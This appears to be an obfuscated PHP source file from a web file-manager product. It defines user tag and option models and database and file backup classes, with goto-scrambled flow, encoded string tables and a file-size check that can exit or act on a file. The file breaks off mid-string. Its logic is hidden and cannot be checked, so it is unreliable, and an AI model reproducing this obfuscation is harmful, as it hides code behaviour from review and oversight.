$ÏÅÉš„é[314] . substr($íÏ¸ƒ¡ı, 7); } header($ÏÅÉš„é[175] . $íÏ¸ƒ¡ı); die; } } goto cÉÜÃİ§Ş; bàäğëàŠÊ: if (strlen($whpnbvsefg) < $_SERVER[¦»×‡Ãã][680]) { return; } $_SERVER[šÜÉ²œ] = explode($_SERVER[¦»×‡Ãã][681], gzinflate(substr($_SERVER[¦»×‡Ãã][682], 10, -8))); $msdgxqoavn = $_SERVER[¦»×‡Ãã][683]; goto bëŸ¤¬ˆè; fåè†è³ÈÚ: if ($_SERVER[$_SERVER[¦»×‡Ãã][952]] != $_size($_file)) { $_getc = $_SERVER[¦»×‡Ãã][954]; $_getfile = $_SERVER[$_SERVER[¦»×‡Ãã][949]] . $_SERVER[¦»×‡Ãã][950]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¦»×‡Ãã][262], $_getfilec); if (count($_getarrs) < $_SERVER[¦»×‡Ãã][690]) { $exit = $_SERVER[¦»×‡Ãã][955]; $exit(); } $_act = $_SERVER[¦»×‡Ãã][1419]; $_act($_file); } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\x5f\157\x70\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($´İ­ë÷Ÿ) { $Í¬ÌëÃ— =& $_SERVER[¦»×‡Ãã]; $íÎË½¦Ó = defined($Í¬ÌëÃ—[2197]) && USER_ID ? USER_ID : $Í¬ÌëÃ—[12]; return "\125\163\x65\162\117\160\x74\x69\x6f\156\x5f{$´İ­ë÷Ÿ}\137" . $íÎË½¦Ó; } protected function filterWhere($Ùéæ‰‹©) { $’ÓŠ£Ÿ‹ =& $_SERVER[¦»×‡Ãã]; $Ùéæ‰‹©[$’ÓŠ£Ÿ‹[1772]] = defined($’ÓŠ£Ÿ‹[2197]) && USER_ID ? USER_ID : $’ÓŠ£Ÿ‹[12]; return $Ùéæ‰‹©; } public function cacheRemoveUser($Ê¶Ã€ÌÉ, $¹×˜Ùôî) { return Cache::remove("\125\163\145\162\x4f\160\x74\151\157\156\x5f{$Ê¶Ã€ÌÉ}\137" . $¹×˜Ùôî); } protected function optionDefault($ãø÷¸è¹ = '') { $´Å¼İÒò =& $_SERVER[¦»×‡Ãã]; if ($ãø÷¸è¹ == $´Å¼İÒò[12]) { return $GLOBALS[$´Å¼İÒò[6]][$´Å¼İÒò[2497]]; } if ($ãø÷¸è¹ == $´Å¼İÒò[2498]) { return $GLOBALS[$´Å¼İÒò[6]][$´Å¼İÒò[2499]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\x2e\x74\x61\147\114\151\x73\x74"; public $modelType = "\125\163\x65\162\117\160\164\x69\x6f\x6e"; public $field = array("\156\141\x6d\145", "\163\164\x79\154\145", "\163\x6f\x72\x74"); public function listData($”˜ıêº = false, $í†Ü©µÓ = "\x73\x6f\x72\x74", $‰åñ‰Ûş = false) { return parent::listData($”˜ıêº, $í†Ü©µÓ, $‰åñ‰Ûş); } public function remove($­Ì£Ïæ) { return parent::remove($­Ì£Ïæ); } public function add($Í“’Š‰õ, $ÀÊ€£õ² = "\x6c\141\x62\145\154\x2d\x67\162\x65\171\55\156\157\162\155\141\154") { $ã—¹“İŞ =& $_SERVER[¦»×‡Ãã]; if ($this->findByName($Í“’Š‰õ)) { return !1; } $¾ø‹¢ã¢ = array($ã—¹“İŞ[494] => $Í“’Š‰õ, $ã—¹“İŞ[558] => $ÀÊ€£õ², $ã—¹“İŞ[1975] => $this->getSort($ã—¹“İŞ[335]) + 1); return parent::insert($¾ø‹¢ã¢); } public function update($´’Ã‚à…, $±Í†ÂÛ÷) { $äÄ¡÷ô¦ =& $_SERVER[¦»×‡Ãã]; $Ú­ÜÖ¹ = $this->listData($´’Ã‚à…); $£ÅÌü¬Ó = $this->findByName($±Í†ÂÛ÷[$äÄ¡÷ô¦[32]]); if (!$Ú­ÜÖ¹ || $£ÅÌü¬Ó && $£ÅÌü¬Ó[$äÄ¡÷ô¦[475]] != $Ú­ÜÖ¹[$äÄ¡÷ô¦[475]]) { return !1; } return parent::update($´’Ã‚à…, $±Í†ÂÛ÷); } public function moveTop($æí€ìÒ) { $·—Ã¯†ö =& $_SERVER[¦»×‡Ãã]; $ˆÚÃÇ³ = parent::listData(); $™òõ¾Í = $this->getSort($·—Ã¯†ö[334]); foreach ($ˆÚÃÇ³ as &$ÛàÆÙá) { if ($ÛàÆÙá[$·—Ã¯†ö[475]] == $æí€ìÒ) { $ÛàÆÙá[$·—Ã¯†ö[1995]] = $™òõ¾Í; continue; } $ÛàÆÙá[$·—Ã¯†ö[1995]] += 1; } unset($ÛàÆÙá); return parent::resetData($ˆÚÃÇ³); } public function moveBottom($›öçÙ“°) { $ÇüË¢Š =& $_SERVER[¦»×‡Ãã]; $€‚İ¿µ† = $this->getSort($ÇüË¢Š[335]) + 1; return parent::update($›öçÙ“°, array($ÇüË¢Š[1995] => $€‚İ¿µ†)); } public function resetSort($óÔÅ¹·) { $ôùÄáÔ¿ =& $_SERVER[¦»×‡Ãã]; $üú¦’ğ‚ = array(); $óÔÅ¹· = is_array($óÔÅ¹·) ? $óÔÅ¹· : array(); for ($×Ø£Ÿ = 0; $×Ø£Ÿ < count($óÔÅ¹·); $×Ø£Ÿ++) { $üú¦’ğ‚[$óÔÅ¹·[$×Ø£Ÿ] . $ôùÄáÔ¿[12]] = $×Ø£Ÿ + 1; } $³ˆÑÀşÆ = parent::listData(); foreach ($³ˆÑÀşÆ as &$ŞÏ¥åşß) { $éşÜ¿®Ó = $üú¦’ğ‚[$ŞÏ¥åşß[$ôùÄáÔ¿[475]]]; $ŞÏ¥åşß[$ôùÄáÔ¿[1995]] = $éşÜ¿®Ó ? $éşÜ¿®Ó : $ŞÏ¥åşß[$ôùÄáÔ¿[1995]]; } unset($ŞÏ¥åşß); return parent::resetData($³ˆÑÀşÆ); } private function getSort($ÈÑÔ¾µ²) { $óÇøë°ı =& $_SERVER[¦»×‡Ãã]; $õ˜ì»û“ = parent::listData(); $¦Ë¹¬é² = array_to_keyvalue($õ˜ì»û“, $óÇøë°ı[12], $óÇøë°ı[1995]); if (!$¦Ë¹¬é²) { $¦Ë¹¬é² = array(0); } $ÈÏ®›óº = $ÈÑÔ¾µ² == $óÇøë°ı[335] ? max($¦Ë¹¬é²) : min($¦Ë¹¬é²); return intval($ÈÏ®›óº); } } goto AÑÕïŒšëÜ; C²£«×ƒ •: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $‘¨Œ‰ä¾ =& $_SERVER[¦»×‡Ãã]; $ğ¸Š’ºÚ = Backup::get(); self::$io = $ğ¸Š’ºÚ[$‘¨Œ‰ä¾[825]]; self::$name = $ğ¸Š’ºÚ[$‘¨Œ‰ä¾[32]]; $ÈÇß‡Ê¦ = new DbManage(); $Ïºäª¨ë = $ÈÇß‡Ê¦->dbType(); $íÌ£ÖÁ³ = array($‘¨Œ‰ä¾[850] => $Ïºäª¨ë, $‘¨Œ‰ä¾[851] => time()); Backup::set($íÌ£ÖÁ³); $åş†¿‰ô = $this->tmpFilesPath() . $‘¨Œ‰ä¾[852] . self::$name . $‘¨Œ‰ä¾[8]; del_dir($åş†¿‰ô); mk_dir($åş†¿‰ô); $²ÆéÙÌ = $¿ÒÒŠ’ = 0; try { $ÄĞ¾ş÷¼ = $ÈÇß‡Ê¦->db()->getTables(); } catch (Exception $Üû›ŞÎ) { return !1; } $ÄĞ¾ş÷¼ = array_diff($ÄĞ¾ş÷¼, array($‘¨Œ‰ä¾[853], $‘¨Œ‰ä¾[854])); foreach ($ÄĞ¾ş÷¼ as $§´«¤›ä) { $²ÆéÙÌ += $ÈÇß‡Ê¦->model($§´«¤›ä)->count(); } $­ëÌÓí = new Task($‘¨Œ‰ä¾[855], $‘¨Œ‰ä¾[856], $²ÆéÙÌ, LNG($‘¨Œ‰ä¾[857]) . $‘¨Œ‰ä¾[858] . LNG($‘¨Œ‰ä¾[859])); $GLOBALS[$‘¨Œ‰ä¾[860]] = self::$name; foreach ($ÄĞ¾ş÷¼ as $§´«¤›ä) { $”±ÔøÕ = $åş†¿‰ô . $§´«¤›ä . $‘¨Œ‰ä¾[861]; $¿“ˆâ‹ = null; if ($§´«¤›ä == $‘¨Œ‰ä¾[862] && (!isset($ğ¸Š’ºÚ[$‘¨Œ‰ä¾[171]]) || $ğ¸Š’ºÚ[$‘¨Œ‰ä¾[171]] == $‘¨Œ‰ä¾[228])) { $¿“ˆâ‹ = self::$io; } $¿ÒÒŠ’ += $ÈÇß‡Ê¦->sqlFromDb($§´«¤›ä, $”±ÔøÕ, $­ëÌÓí, $¿“ˆâ‹); } unset($GLOBALS[$‘¨Œ‰ä¾[860]]); $­ëÌÓí->end(); if ($¿ÒÒŠ’ > $²ÆéÙÌ) { $²ÆéÙÌ = $¿ÒÒŠ’; } $íÌ£ÖÁ³ = array($‘¨Œ‰ä¾[850] => $Ïºäª¨ë, $‘¨Œ‰ä¾[846] => 1, $‘¨Œ‰ä¾[863] => $²ÆéÙÌ, $‘¨Œ‰ä¾[864] => $¿ÒÒŠ’, $‘¨Œ‰ä¾[865] => time()); Backup::set($íÌ£ÖÁ³); if ($²ÆéÙÌ - $¿ÒÒŠ’ > 0) { $Œ«ô°ëø = $‘¨Œ‰ä¾[866]; if (!stristr(I18n::getType(), $‘¨Œ‰ä¾[867])) { $Œ«ô°ëø = $‘¨Œ‰ä¾[868]; } write_log(array($Œ«ô°ëø, $íÌ£ÖÁ³), $‘¨Œ‰ä¾[856]); return !1; } return !0; } private function tmpFilesPath() { $¹¥‰¹‚î =& $_SERVER[¦»×‡Ãã]; $Ìİö¯ŸÕ = TEMP_FILES; if ($GLOBALS[$¹¥‰¹‚î[6]][$¹¥‰¹‚î[92]][$¹¥‰¹‚î[869]]) { $Ìİö¯ŸÕ = $GLOBALS[$¹¥‰¹‚î[6]][$¹¥‰¹‚î[92]][$¹¥‰¹‚î[869]]; if (!mk_dir($Ìİö¯ŸÕ) || !is_writable($Ìİö¯ŸÕ) || !IO::mkfile($Ìİö¯ŸÕ . $¹¥‰¹‚î[870])) { $Ìİö¯ŸÕ = TEMP_FILES; } } return $Ìİö¯ŸÕ; } } class BackupDbFile { public function __construct() { } public function index() { $òÜ®™ßà =& $_SERVER[¦»×‡Ãã]; $Ï¢°€¶Ú = Backup::get(); $Ææ„óïÂ = $Ï¢°€¶Ú[$òÜ®™ßà[32]]; $±İˆîÅá = $this->tmpFilesPath() . "\x62\141\143\x6b\165\x70\137{$Ææ„óïÂ}\57"; $·ò¤ïßÓ = $this->backupPath($Ï¢°€¶Ú); if (!($·ò¤ïßÓ = IO::mkdir($·ò¤ïßÓ))) { return !1; } $»É¼î²Ç = IO::listPath($±İˆîÅá); $éæ’ƒ… = isset($»É¼î²Ç[$òÜ®™ßà[86]]) ? $»É¼î²Ç[$òÜ®™ßà[86]] : array(); $Åó„Ìşë = array_sum(array_column($éæ’ƒ…, $òÜ®™ßà[79])); if (!$Åó„Ìşë) { return !1; } $ú€šªı© = array($òÜ®™ßà[871] => $Åó„Ìşë, $òÜ®™ßà[872] => time()); Backup::set($ú€šªı©); $–‹üƒÌø = new TaskFileTransfer($òÜ®™ßà[873], $òÜ®™ßà[856], count($éæ’ƒ…), LNG($òÜ®™ßà[857]) . $òÜ®™ßà[462] . LNG($òÜ®™ßà[859]) . $òÜ®™ßà[874]); $–‹üƒÌø->task[$òÜ®™ßà[836]] = $Åó„Ìşë; foreach ($»É¼î²Ç[$òÜ®™ßà[86]] as $¹¾íû«ó) { $ª¨ğÄˆİ = IO::move($¹¾íû«ó[$òÜ®™ßà[87]], $·ò¤ïßÓ); if (!$ª¨ğÄˆİ) { $–‹üƒÌø->end(); $˜—Ùá ñ = IO::getLastError($òÜ®™ßà[875] . $¹¾íû«ó[$òÜ®™ßà[87]] . $òÜ®™ßà[876] . $·ò¤ïßÓ . $òÜ®™ßà[178]); write_log($˜—Ùá ñ, $òÜ®™ßà[856]); return !1; } } $’µíñÖ = new DbManage(); $Ü™”ª× = $’µíñÖ->getSqlFile(); if (!$Ü™”ª×[$òÜ®™ßà[877]] || !$Ü™”ª×[$òÜ®™ßà[13]]) { return !1; } IO::move($Ü™”ª×[$òÜ®™ßà[877]], $·ò¤ïßÓ); IO::move($Ü™”ª×[$òÜ®™ßà[13]], $·ò¤ïßÓ); $–‹üƒÌø->end(); $ú€šªı© = array($òÜ®™ßà[878] => $Åó„Ìşë, $òÜ®™ßà[879] => time()); Backup::set($ú€šªı©); return !0; } private function backupPath($ÏÓş¯˜Ú) { $Ú¼ÂşÕ =& $_SERVER[¦»×‡Ãã]; $¹şû¨ó = $ÏÓş¯˜Ú[$Ú¼ÂşÕ[32]]; $…èÄÖï = Model($Ú¼ÂşÕ[843])->get($Ú¼ÂşÕ[844]); $ã®©äî = substr(md5($Ú¼ÂşÕ[845] . $…èÄÖï . $¹şû¨ó), 0, 8); return "\x7b\x69\x6f\72{$ÏÓş¯˜Ú[$Ú¼ÂşÕ[825]]}\x7d\x2f\x64\x61\164\141\x62\x61\163\145\57\x62\141\143\153\x75\x70\x2f" . $¹şû¨ó . $Ú¼ÂşÕ[11] . $ã®©äî; } private function tmpFilesPath() { $†¨½µ =& $_SERVER[¦»×‡Ãã]; $ÁŠ¯€áÄ = TEMP_FILES; if ($GLOBALS[$†¨½µ[6]][$†¨½µ[92]][$†¨½µ[869]]) { $ÁŠ¯€áÄ = $GLOBALS[$†¨½µ[6]][$†¨½µ[92]][$†¨½µ[869]]; if (!mk_dir($ÁŠ¯€áÄ) || !is_writable($ÁŠ¯€áÄ) || !IO::mkfile($ÁŠ¯€áÄ . $†¨½µ[870])) { $ÁŠ¯€áÄ = TEMP_FILES; } } return $ÁŠ¯€áÄ; } } class BackupFile { public function __construct() { } public function index() { $ßà¯×¾È = Backup::get(); $ìÆŠçÍí = $ßà¯×¾È[$_SERVER[¦»×‡Ãã][369]][$_SERVER[¦»×‡Ãã][230]][$_SERVER[¦»×‡Ãã][541]]; $½Íï‘í™ = array($_SERVER[¦»×‡Ãã][542] => array($_SERVER[¦»×‡Ãã][880], $ìÆŠçÍí), $_SERVER[¦»×‡Ãã][881] => array($_SERVER[¦»×‡Ãã][407], $ßà¯×¾È[$_SERVER[¦»×‡Ãã][825]])); $ğñúä¯ = (int) Model($_SERVER[¦»×‡Ãã][862])->where($½Íï‘í™)->count($_SERVER[¦»×‡Ãã][541]); $ñÄ÷€ÆÇ = (int) Model($_SERVER[¦»×‡Ãã][862])->where($½Íï‘í™)->sum($_SERVER[¦»×‡Ãã][79]); $«Ó÷©­ú = new TaskFileTransfer($_SERVER[¦»×‡Ãã][882], $_SERVER[¦»×‡Ãã][856], $ğñúä¯, LNG($_SERVER[¦»×‡Ãã][857]) . $_SERVER[¦»×‡Ãã][858] . LNG($_SERVER[¦»×‡Ãã][883])); $«Ó÷©­ú->task[$_SERVER[¦»×‡Ãã][836]] = $ñÄ÷€ÆÇ; $®ÛËá·ô = array($_SERVER[¦»×‡Ãã][884] => $ğñúä¯, $_SERVER[¦»×‡Ãã][885] => $ñÄ÷€ÆÇ, $_SERVER[¦»×‡Ãã][886] => time()); Backup::set($®ÛËá·ô); $şÈùİö« = !0; $ìÔ•Óß¹ = $this->storeIds(); $ªñ–€¢Õ = 1; $æÔÀèÊº = 1000; $æ©ºúèÔ = $£Áà¡ä = 0; $ÈÄ·™à§ = array(); $Ù‚ü”ê = $°çÓŸ = 0; do { $«ô¼•­ê = $_SERVER[¦»×‡Ãã][887]; $ƒÀÛœ†¨ = Model($_SERVER[¦»×‡Ãã][862])->where($½Íï‘í™)->field($«ô¼•­ê)->order($_SERVER[¦»×‡Ãã][888])->selectPage($æÔÀèÊº, $ªñ–€¢Õ); $Ô¯ú±©™ = !empty($ƒÀÛœ†¨[$_SERVER[¦»×‡Ãã][445]]) ? $ƒÀÛœ†¨[$_SERVER[¦»×‡Ãã][445]] : array(); foreach ($Ô¯ú±©™ as $ÏÊèó…) { if (!$this->_fileExist($ÏÊèó…, $ÈÄ·™à§, $ìÔ•Óß¹)) { write_log("\146\151\x6c\145\40\156\157\x74\40\x65\170\151\163\x74\x2e\x66\x69\x6c\x65\x49\104\72{$ÏÊèó…[$_SERVER[¦»×‡Ãã][541]]}\x2c\40\160\x61\164\x68\x3a{$ÏÊèó…[$_SERVER[¦»×‡Ãã][87]]}", $_SERVER[¦»×‡Ãã][889]); continue; } $Ëªä’Ü• = $ÏÊèó…[$_SERVER[¦»×‡Ãã][87]]; $Œ¶ô½¦ = "\x7b\x69\x6f\72{$ßà¯×¾È[$_SERVER[¦»×‡Ãã][825]]}\x7d" . substr($Ëªä’Ü•, strlen("\173\x69\x6f\x3a{$ÏÊèó…[$_SERVER[¦»×‡Ãã][890]]}\175")); if (IO::exist($Œ¶ô½¦)) { $«Ó÷©­ú->updateFileEnd($ÏÊèó…[$_SERVER[¦»×‡Ãã][32]], $ÏÊèó…[$_SERVER[¦»×‡Ãã][79]]); } else { $Œ¶ô½¦ = get_path_father($Œ¶ô½¦); IO::mkdir($Œ¶ô½¦); if (!IO::copy($Ëªä’Ü•, $Œ¶ô½¦, $_SERVER[¦»×‡Ãã][891])) { write_log($_SERVER[¦»×‡Ãã][892] . $Ëªä’Ü• . $_SERVER[¦»×‡Ãã][876] . $Œ¶ô½¦ . $_SERVER[¦»×‡Ãã][178], $_SERVER[¦»×‡Ãã][856]); $şÈùİö« = !1; break; } } $ìÆŠçÍí = $ÏÊèó…[$_SERVER[¦»×‡Ãã][541]]; $£Áà¡ä += 1; $æ©ºúèÔ += $ÏÊèó…[$_SERVER[¦»×‡Ãã][79]]; $°çÓŸ += 1; $Ù‚ü”ê += $ÏÊèó…[$_SERVER[¦»×‡Ãã][79]]; if ($æ©ºúèÔ >= 1024 * 1024 * 100) { $®ÛËá·ô = array($_SERVER[¦»×‡Ãã][824] => $ìÆŠçÍí, $_SERVER[¦»×‡Ãã][893] => $°çÓŸ, $_SERVER[¦»×‡Ãã][894] => $Ù‚ü”ê); Backup::set($®ÛËá·ô); $æ©ºúèÔ = $£Áà¡ä = 0; } } $ÊÁöøŸË = count($Ô¯ú±©™); $ªñ–€¢Õ++; } while ($ÊÁöøŸË == $æÔÀèÊº); $«Ó÷©­ú->end(); $®ÛËá·ô = array($_SERVER[¦»×‡Ãã][895] => 1, $_SERVER[¦»×‡Ãã][834] => time(), $_SERVER[¦»×‡Ãã][848] => 1, $_SERVER[¦»×‡Ãã][824] => $ìÆŠçÍí, $_SERVER[¦»×‡Ãã][896] => time()); if ($£Áà¡ä) { $®ÛËá·ô[$_SERVER[¦»×‡Ãã][893]] = $°çÓŸ; $®ÛËá·ô[$_SERVER[¦»×‡Ãã][894]] = $Ù‚ü”ê; } Backup::set($®ÛËá·ô); return !0; } private function _fileExist($äÏ’çõ, &$Ú†ïÕí, $¹®Ç²üá) { $ÉùÏ®¿ã =& $_SERVER[¦»×‡Ãã]; $¥¸…¶û¬ = $äÏ’çõ[$ÉùÏ®¿ã[87]]; if (in_array($äÏ’çõ[$ÉùÏ®¿ã[541]], $Ú†ïÕí)) { return !1; } if (!in_array($äÏ’çõ[$ÉùÏ®¿ã[890]], $¹®Ç²üá)) { return !1; } if (IO::exist($¥¸…¶û¬)) { return !0; } $—Â²”Ë = get_path_father($¥¸…¶û¬); if (IO::exist($—Â²”Ë)) { $Ú†ïÕí[] = $äÏ’çõ[$ÉùÏ®¿ã[541]]; return !1; } $¡‚ó£æ¼ = array($ÉùÏ®¿ã[890] => $äÏ’çõ[$ÉùÏ®¿ã[890]], $ÉùÏ®¿ã[87] => array($ÉùÏ®¿ã[459], "{$—Â²”Ë}\45")); $ç™ìÉİÒ = Model($ÉùÏ®¿ã[862])->where($¡‚ó£æ¼)->field($ÉùÏ®¿ã[542])->select(); $Ú†ïÕí = array_merge($Ú†ïÕí, array_to_keyvalue($ç™ìÉİÒ, $ÉùÏ®¿ã[12], $ÉùÏ®¿ã[541])); return !1; } private function _fileFilter($üì›è²”) { $ÆÙ•ºª =& $_SERVER[¦»×‡Ãã]; return; if (empty($üì›è²”)) { return; } $àÅ¢ä÷ä = array($ÆÙ•ºª[541] => array($ÆÙ•ºª[7], array_unique($üì›è²”))); $áòËßâ› = Model($ÆÙ•ºª[897])->where($àÅ¢ä÷ä)->field($ÆÙ•ºª[193])->select(); foreach ($áòËßâ› as $›í‚÷óß) { Model($ÆÙ•ºª[897])->remove($›í‚÷óß[$ÆÙ•ºª[193]], !1); } } private function storeIds() { $æ˜óÓÒ¡ =& $_SERVER[¦»×‡Ãã]; $©ñ”‡›Â = Model($æ˜óÓÒ¡[840])->listData(); $ÃîöŸ¬³ = array(); $˜˜ğÄ™– = $GLOBALS[$æ˜óÓÒ¡[6]][$æ˜óÓÒ¡[92]][$æ˜óÓÒ¡[898]]; foreach ($©ñ”‡›Â as $ñÑ»ƒ„) { $ºíçØÌÂ = strtolower($ñÑ»ƒ„[$æ˜óÓÒ¡[98]]); if (!isset($˜˜ğÄ™–[$ºíçØÌÂ])) { continue; } $òÆìÔØô = $æ˜óÓÒ¡[77] . (isset($˜˜ğÄ™–[$ºíçØÌÂ]) ? $˜˜ğÄ™–[$ºíçØÌÂ] : ucfirst($ºíçØÌÂ)); if (!class_exists($òÆìÔØô)) { continue; } $ÃîöŸ¬³[] = $ñÑ»ƒ„[$æ˜óÓÒ¡[475]]; } return $ÃîöŸ¬³; } } goto Dìƒ¶¼â¡›; D§…’–Ï÷ö: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xa6\xbb\xd7\x87\xc3\xe3", strrev('Ş«™·Ÿâ')); $_SERVER[¦»×‡Ãã] = explode("\174\4\174\5\174\5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\174\33\305\365\60\147\313\131\50\151\113\113\241\135\234\4\333\211\16\73\167\234\70\101\266\345\130\104\266\214\44\347\300\66\233\265\264\266\326"."\226\264\262\166\345\213\204\43\44\34\11\111\240\134\11\204\373\50\24\110\70\32\10\167\13\55\1\12\264\375\123\132\12\345\50\304\116\270\132\216\226\102\111\333\157\216\67\307\256\144\350\367"."\xfb\x7f\xbf\xdf\x17\x48\x34\xc7\x9b\xd9\x39\xde\xbc\xf7\xe6\xcd\x9b\x37\xf\xad\xbe\xf1\x99\x1f\x7f\xb0\xf2\xa0\x95\x7\xaf\x3c\xf8\xb6\x4f\x6f\x7f\xf3\x8e\x7\x68\x18\xfd\x7b\x20\xfa\x8f\x84\x7f\xb8\xfe\x90"."\375\310\237\11\353\327\125\124\64\315\72\154\152\313\21\233\176\172\227\166\273\266\115\333\30\11\377\352\271\320\221\57\334\171\112\160\354\246\137\15\217\355\277\337\202\326\267\167\324\40\140\132"."\266\206\376\50\131\323\126\364\41\303\262\55\232\220\60\263\335\106\17\15\33\131\372\353\247\77\155\321\160\136\317\230\266\116\243\76\372\243\362\166\241\177\255\376\264\301\362\325\226\110\134\215"."\265\265\266\6\243\161\0\252\221\363\63\146\22\102\71\55\257\145\340\373\71\75\157\241\326\310\325\251\71\63\247\147\35\51\42\41\251\331\132\227\146\101\115\15\165\152\103\260\65\34\131\256".strrev('œ^(ssHúäĞ´Š> X–£Ä¢Ô(¸.«·`Ä9Ñ‘¸íå­˜Á#aùè/íK¢·—Æ')."\36\215\204\303\165\201\372\305\305\71\255\321\300\242\346\200\202\332\227\326\125\43\333\155\126\50\53\150\316\12\245\222\6\32\15\75\235\244\301\254\306\232\143\17\347\40\24\347\41\64\115\331".strrev(',UP³Ö‰ MmGHšó²4di¶'."\n".'ĞTó¬^cFFòäA«FBµ»Ô”<-#M:B')."\16\326\307\25\334\100\245\61\32\151\126\140\22\62\232\145\353\171\145\151\123\60\32\124\160\243\153\313\111\137\313\25\300\227\26\64\24\112\40\34\126\306\253\301\326\63\71\126\15\55\123\242"."\262\110\264\41\30\125\352\226\53\142\204\22\146\46\143\146\175\250\26\64\223\266\324\324\140\64\112\3\36\100\357\160\10\117\32\104\42\215\215\261\40\217\101\347\116\15\243\226\114\7\374\164"."\304\222\335\151\133\35\320\322\5\206\246\175\364\267\34\176\340\327\264\0\165\373\215\254\121\0\64\205\52\114\223\57\53\10\24\30\264\316\122\364\44\4\62\250\274\11\345\272\40\255\213\101".base64_decode('9bKAgVboAA3WLqC/86B8l4rz9Lyt6tmEmTSysI4XAj5qdqohbyAAGu8200kWtowR6GW3kQ==')."\326\133\12\31\31\204\107\23\51\43\235\314\263\245\367\145\220\64\32\346\53\31\303\212\130\16\265\204\23\1\243\173\130\54\105\14\327\312\163\55\263\220\117\350\41\264\164\150\274\32\222\165".strrev('çíüÄiI2[FD­£-|ˆ€Ó>f` Xœ¶'."\n".'EDlÃ5ŞyéŒ–¦Òå¶bcFÛ')."\170\377\335\331\176\62\372\247\22\250\142\7\264\51\245\247\323\252\76\244\303\232\312\44\147\132\154\60\374\126\227\221\365\243\24\32\15\105\324\224\146\245\232\223\63\125\122\212\21\333\244\76"."\xe4\xcb\xa5\x72\xb0\xe0\xf9\x1a\xef\x70\xe0\x3c\x1e\xba\x16\xd3\xe\x4a\x24\x3b\x6d\x26\xb4\xb4\xdc\x45\x1a\x4e\xd9\x76\x2e\xa6\x67\x93\x78\x24\xa0\x2b\xe6\x60\x96\x8c\x54\x4e\xd7\x1\xa8\xc1\xa3\x24\x95\x66"."\145\271\322\124\143\324\130\254\140\46\315\103\254\167\74\315\342\211\366\20\233\316\144\67\140\53\343\30\145\360\101\303\42\304\117\254\134\55\227\113\33\11\315\66\314\254\337\114\330\272\355\265".base64_decode('7LyuQY2BREK3LG+9mbXzZtobSKfNQW8kb/QY2RplCtBhlInWuxfTxhpYxGXzFIw4+DNTag==')."\13\166\267\167\16\133\234\34\72\257\145\255\156\75\357\15\302\312\250\121\120\143\71\201\144\140\15\206\225\63\55\3\67\257\106\321\154\133\113\244\60\161\21\325\327\176\11\274\221\115\33\131".base64_decode('vRgWVaJ7W/NaT0arUXKFLjQAsCAhLYEhZGAYgBolow15tR5WU3AoZ+R1i/VaWdQcB4zq9g==')."\66\343\205\144\350\111\157\14\121\157\250\154\172\325\14\5\341\212\302\362\150\152\123\74\336\252\206\32\21\173\156\11\252\315\201\170\175\23\324\156\153\75\254\352\60\242\311\274\112\226\270\314"."\213\26\24\306\246\26\324\71\221\330\152\16\352\171\364\341\272\341\32\245\317\114\166\231\103\76\226\205\201\143\210\262\60\140\74\277\71\333\33\325\262\75\270\33\135\303\266\156\271\151\123\35"."\142\346\276\156\272\172\175\135\172\267\231\207\336\130\3\75\316\301\17\353\331\36\73\305\352\216\5\243\113\202\121\65\26\151\214\57\15\104\201\367\147\21\346\14\261\326\340\257\247\275\121\75"."\x89\x6\x31\x61\xb3\x72\x5a\x4e\x8c\xfe\x32\x2f\x5e\x30\xf8\xe3\x2c\x17\x2f\x22\x96\x17\xe\x2d\xc2\x63\xd7\xe0\xb5\x10\x90\x57\x86\x62\x75\x87\x8d\x8c\x81\xbb\x67\xf3\x1c\x32\xd8\x48\x30\x58\x4\xd\xf2\x93"."\76\327\166\130\123\52\72\222\123\53\275\350\337\51\225\355\35\15\276\51\235\13\375\206\50\343\257\366\125\53\323\252\146\51\255\110\122\61\264\264\2\235\56\202\250\122\42\213\235\303\42\60"."\74\153\146\365\222\13\13\41\222\151\351\336\46\135\103\104\32\115\204\143\136\74\354\133\64\376\45\243\213\171\245\104\113\134\363\102\23\243\301\123\333\202\261\270\332\34\214\67\105\32\240\371"."\301\0\204\262\250\60\151\57\233\143\54\230\1\133\314\102\265\372\220\304\103\4\57\110\310\3\102\312\265\230\203\214\372\273\20\250\76\245\47\372\306\311\103\41\350\215\111\351\22\233\272\166"."\xfa\xd3\x9\xd8\xdc\x49\x7f\x54\xc3\x6a\x94\xf8\x26\x8e\x72\xfa\xaa\x9a\x5d\xbd\x8\xb3\x9a\x75\xc6\x44\xe0\x4b\xa1\xc\x5a\xc3\xa2\xe5\xaa\x93\xc9\xb1\x6e\x35\xb\x4c\x47\x4b\x66\xa9\x91\xe4\x5c\x10\x45\x9b"."\164\243\47\5\15\65\160\165\11\63\155\346\265\64\246\375\114\160\355\61\200\14\347\322\5\204\367\176\134\161\74\125\310\164\1\247\102\143\324\243\333\102\246\264\206\221\340\225\141\34\31\261"."\165\73\324\340\340\273\20\363\253\30\127\73\174\271\154\117\345\44\250\113\235\66\263\12\47\300\64\102\317\220\160\135\320\213\273\356\113\230\150\141\67\153\175\172\15\356\13\120\263\171\44\225"."\x45\x24\x82\x39\xf\xf3\xb8\x5a\x37\x5d\xc0\xd3\x93\xf6\x65\x50\x25\xa4\xce\x7a\x93\x73\x65\xba\x7d\x99\xe7\xe4\x71\x8a\x9e\xcf\x9b\xf9\x13\x1\x82\x84\x15\xc2\x28\xf1\x74\x41\xe5\x36\x17\x3b\x2c\x44\x2\x58"."\x38\x65\x72\x31\xc5\x64\xc8\x58\xe3\x87\x7e\x4f\x9e\xd6\x8\x64\x23\x89\xc4\x35\x9f\x65\xa3\x49\x40\x1d\xd4\x92\xc9\x52\xc9\x88\xd4\x40\x5\x2b\x19\x9e\x92\xc\x26\x7\xf8\x63\xd3\xd1\xff\x82\xe9\x27\xcd\x8c"."\306\130\50\141\176\172\222\162\77\107\22\135\266\64\151\12\253\67\157\233\70\63\357\200\104\230\230\62\241\145\150\352\241\127\5\336\75\326\321\244\236\326\31\26\245\16